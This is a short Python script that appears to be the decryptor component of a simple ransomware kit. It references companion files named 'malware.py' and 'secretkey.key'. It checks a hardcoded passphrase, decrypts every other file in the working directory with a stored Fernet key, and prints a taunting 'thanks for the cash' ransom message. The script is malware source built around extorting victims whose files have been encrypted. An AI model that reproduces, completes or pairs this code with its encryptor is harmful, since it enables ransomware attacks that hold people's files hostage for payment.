import os
from cryptography.fernet import Fernet

files = []

passphrase = "w9hgf7rty73nmhtgd943"

user_phrase = input("Whats the passphrase? If it's correct your files will be decrypted\n")

for file in os.listdir():
    if file == "malware.py" or file == "secretkey.key" or file == "decrypt.py":
        continue
    elif os.path.isfile(file):
        files.append(file)

with open("secretkey.key", "rb") as key:
  secret_key = key.read()

if user_phrase == passphrase:
    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_decrypted = Fernet(secret_key).decrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_decrypted)

    print(files)

    print("Heres your files back, thanks for the cash")

else:
    print("Wrong passphrase")
